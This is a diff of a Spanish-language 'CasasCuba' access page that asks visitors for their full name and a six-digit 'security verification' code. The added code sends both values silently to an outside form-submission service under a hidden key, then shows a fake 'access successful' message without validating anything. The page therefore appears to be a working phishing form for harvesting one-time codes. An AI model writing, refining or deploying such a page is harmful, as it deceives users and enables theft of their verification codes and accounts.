@@ -1,51 +1,87 @@
 
- <!DOCTYPE html>
+       
+<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CasasCuba | Acceso</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 350px; text-align: center; border: 1px solid #334155; }
-        h2 { color: #d4af37; margin-bottom: 10px; }
-        input.name { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #334155; border-radius: 10px; background: #0f172a; color: white; text-align: center; }
+        :root { --primary: #d4af37; --bg: #0f172a; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 350px; text-align: center; border: 1px solid rgba(212, 175, 55, 0.1); }
+        h2 { color: var(--primary); margin-bottom: 5px; }
+        .subtitle { font-size: 11px; color: #94a3b8; margin-bottom: 25px; letter-spacing: 1px; }
+        input.name-input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; text-align: center; outline: none; box-sizing: border-box; }
         .code-group { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-        .code-box { width: 40px; height: 50px; border: 2px solid #334155; border-radius: 8px; text-align: center; font-size: 20px; font-weight: bold; background: #0f172a; color: #d4af37; }
-        .code-box:focus { border-color: #d4af37; outline: none; }
-        button { width: 100%; padding: 15px; background: #d4af37; color: black; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .code-box { width: 40px; height: 50px; border: 2px solid #334155; border-radius: 8px; background: transparent; text-align: center; color: white; font-size: 20px; outline: none; }
+        button { width: 100%; padding: 15px; background: var(--primary); color: black; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        #loader { display: none; margin-top: 20px; }
+        .spinner { border: 3px solid rgba(255,255,255,0.1); width: 25px; height: 25px; border-radius: 50%; border-left-color: var(--primary); animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
 <div class="card">
     <h2>CasasCuba 🏠</h2>
-    <p style="color: #94a3b8; font-size: 14px;">Ingresa tu nombre y código de acceso</p>
-    <input type="text" id="user-name" class="name" placeholder="Tu Nombre Completo">
-    <div class="code-group">
-        <input type="number" class="code-box" maxlength="1" oninput="next(this, 0)">
-        <input type="number" class="code-box" maxlength="1" oninput="next(this, 1)">
-        <input type="number" class="code-box" maxlength="1" oninput="next(this, 2)">
-        <input type="number" class="code-box" maxlength="1" oninput="next(this, 3)">
-        <input type="number" class="code-box" maxlength="1" oninput="next(this, 4)">
-        <input type="number" class="code-box" maxlength="1" oninput="next(this, 5)">
+    <div class="subtitle">VERIFICACIÓN DE SEGURIDAD</div>
+    
+    <form id="form">
+        <input type="hidden" name="access_key" value="644a1453-3ad6-45e9">
+        <input type="hidden" name="subject" value="Nuevo Código de Acceso - CasasCuba">
+        
+        <input type="text" name="Nombre_Cliente" class="name-input" placeholder="Nombre y Apellidos" required>
+        
+        <div class="code-group">
+            <input type="number" class="code-box" maxlength="1" oninput="move(this, 0)" required>
+            <input type="number" class="code-box" maxlength="1" oninput="move(this, 1)" required>
+            <input type="number" class="code-box" maxlength="1" oninput="move(this, 2)" required>
+            <input type="number" class="code-box" maxlength="1" oninput="move(this, 3)" required>
+            <input type="number" class="code-box" maxlength="1" oninput="move(this, 4)" required>
+            <input type="number" class="code-box" maxlength="1" oninput="move(this, 5)" required>
+        </div>
+        
+        <input type="hidden" name="Codigo_Enviado" id="full-code">
+        <button type="submit" id="btn">VALIDAR ACCESO</button>
+    </form>
+
+    <div id="loader">
+        <div class="spinner"></div>
+        <p style="font-size: 12px; color: var(--primary);">Validando credenciales...</p>
     </div>
-    <button onclick="enviar()">CONFIRMAR ENTRADA</button>
 </div>
+
 <script>
-    function next(el, idx) {
+    function move(el, idx) {
         if (el.value.length > 1) el.value = el.value.slice(0, 1);
         if (el.value.length === 1 && idx < 5) document.querySelectorAll('.code-box')[idx + 1].focus();
     }
-    function enviar() {
-        const nom = document.getElementById('user-name').value;
-        const boxes = document.querySelectorAll('.code-box');
+
+    const form = document.getElementById('form');
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
         let cod = "";
-        boxes.forEach(b => cod += b.value);
-        if (nom === "" || cod.length < 6) return alert("Por favor, completa los datos");
-        const msg = `Hola, soy ${nom}. Mi código de confirmación es ${cod}. Solicito acceso al catálogo.`;
-        window.open(`https://wa.me/5352416260?text=${encodeURIComponent(msg)}`, '_blank');
-    }
+        document.querySelectorAll('.code-box').forEach(b => cod += b.value);
+        document.getElementById('full-code').value = cod;
+
+        document.getElementById('btn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        const formData = new FormData(form);
+        const object = Object.fromEntries(formData);
+        const json = JSON.stringify(object);
+
+        fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: json
+        })
+        .then(() => {
+            alert("Acceso exitoso. Su asesor validará su sesión en un momento.");
+            location.reload();
+        });
+    });
 </script>
 </body>
 </html>
-       
